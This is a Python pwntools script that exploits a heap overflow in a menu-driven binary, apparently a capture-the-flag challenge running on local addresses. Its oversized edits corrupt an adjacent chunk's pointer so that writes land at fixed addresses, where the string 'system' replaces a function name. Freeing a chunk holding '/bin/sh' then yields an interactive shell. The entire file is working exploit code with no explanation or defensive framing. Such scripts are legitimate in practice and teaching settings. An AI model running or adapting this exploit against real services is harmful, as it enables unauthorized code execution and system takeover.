#coding:utf-8

from pwn import *
from time import sleep

context.log_level = "debug"

local = 1
if local:
    p = remote("172.17.0.2", 1234)
    raw_input("go")
else:
    p = remote("127.0.0.1", 1234)

def add(size, content):
    p.send(p8(1))
    p.send(p8(size))
    p.send(content)

def delete(index):
    p.send(p8(3))
    p.send(p8(index))

def edit(index, size, content):
    p.send(p8(2))
    p.send(p8(index))
    p.send(p8(size))
    p.send(content)


add(0x98,'A' * 0x98)
add(0x98,'A' * 0x98)
edit(0,0xb0,'B' * 0x98 + p64(0x21) + p64(0x98) + p64(0x601eb0))
edit(1,0x8,p64(0x602200))

edit(0,0xb0,'B' * 0x98 + p64(0x21) + p64(0x98) + p64(0x602200))
payload = 'A' * 0x5f + 'system\x00'
edit(1,len(payload),payload)

edit(0,0x8,'/bin/sh\x00')
delete(0)

p.interactive()
